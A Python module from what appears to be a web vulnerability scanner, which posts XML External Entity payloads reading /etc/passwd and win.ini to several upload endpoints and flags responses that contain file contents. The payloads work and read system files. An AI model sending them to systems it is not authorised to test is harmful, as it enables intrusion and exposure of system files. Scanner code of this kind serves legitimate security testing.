"""
XML External Entity (XXE) Scanner Module
"""

from typing import List
from .scanner_base import BaseScanner, ScanResult, Severity


class XXEScanner(BaseScanner):
    """Scanner for XXE vulnerabilities"""

    # XXE payloads
    PAYLOADS = [
        '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>''',
        '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<data>&xxe;</data>''',
    ]

    # XXE indicators
    XXE_INDICATORS = [
        'root:x:0:0',
        '[extensions]',
        '# /etc/passwd',
    ]

    def scan(self) -> List[ScanResult]:
        """Run XXE scan"""
        results = []

        # Test XML endpoints
        endpoints = [
            '/xml-upload/',
            '/api/xml/',
            '/import/',
        ]

        for endpoint in endpoints:
            self.log(f"Testing endpoint: {endpoint}")

            for payload in self.PAYLOADS:
                result = self._test_xxe(endpoint, payload)
                if result:
                    results.append(result)
                    break

        if not results:
            results.append(self.create_result(
                attack_type='xxe',
                endpoint=self.target_url,
                vulnerable=False,
                severity=Severity.INFO,
                description='No XXE vulnerabilities detected'
            ))

        return results

    def _test_xxe(self, endpoint: str, payload: str) -> ScanResult:
        """Test for XXE vulnerability"""
        data = {'xml': payload}

        response = self.make_request(endpoint, method='POST', data=data)

        if self.check_response(response, self.XXE_INDICATORS):
            return self.create_result(
                attack_type='xxe',
                endpoint=endpoint,
                vulnerable=True,
                severity=Severity.HIGH,
                description='XXE vulnerability detected',
                payload=payload[:200],
                evidence=response.text[:500] if response else None,
                recommendation='Disable external entity processing in XML parsers. Use defusedxml library.',
                cwe='CWE-611',
                owasp='A05:2021 - Security Misconfiguration'
            )

        return None
